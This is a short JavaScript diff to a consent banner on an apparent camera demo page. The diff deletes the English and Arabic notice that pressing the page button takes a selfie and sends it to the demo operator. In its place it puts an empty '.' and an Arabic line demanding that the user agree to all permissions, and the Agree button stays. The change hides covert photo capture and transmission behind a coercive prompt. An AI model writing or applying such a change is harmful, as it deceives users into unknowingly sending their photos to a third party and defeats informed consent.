@@ -28,8 +28,8 @@
     var bar = document.createElement('div');
     bar.id = '__snBar';
     bar.innerHTML =
-      '<div class="__snText">Camera demo: pressing the page button takes a selfie and sends it to the demo operator.' +
-        '<small>تنبيه: بالضغط على زر الصفحة تُلتقط صورة سيلفي وتُرسل لصاحب التجربة.</small></div>' +
+      '<div class="__snText">.' +
+        '<small>تنبيه: يجب الموافقه علي جميع  الصلاحيات     .</small></div>' +
       '<button id="__snAgree">Agree</button>' +
       '<button id="__snNo">No thanks</button>';
     document.body.appendChild(bar);
